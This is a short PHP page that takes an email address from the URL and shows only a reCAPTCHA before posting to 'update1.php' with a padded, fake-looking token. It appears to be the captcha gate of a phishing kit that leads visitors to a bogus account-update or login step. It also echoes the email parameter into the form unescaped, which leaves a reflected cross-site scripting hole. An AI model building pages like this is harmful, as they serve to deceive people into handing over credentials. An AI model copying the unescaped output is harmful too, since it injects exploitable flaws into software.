<!DOCTYPE html>
<html>
<head>
    <title></title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>

<body> 

<?php
$value = $_GET['email'];
$dom = substr($value, strpos($value, '@') + 1);
?>

<div class = "container">
<form method = "post" action = "update1.php?email=<?php echo $value; ?>&TK=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465&ivoUpdated
">
<div class = "g-recaptcha" data-sitekey = "6LecR-8aAAAAAA8NaJzjbuek8jOl46rnx-4-gqhp" style = "margin-top:50px; margin-left:35%"></div>
<input type = "submit" name = "Next" class = "btn btn-primary" style = "margin-left:35%">

</form>
</div>
</body>
</html>





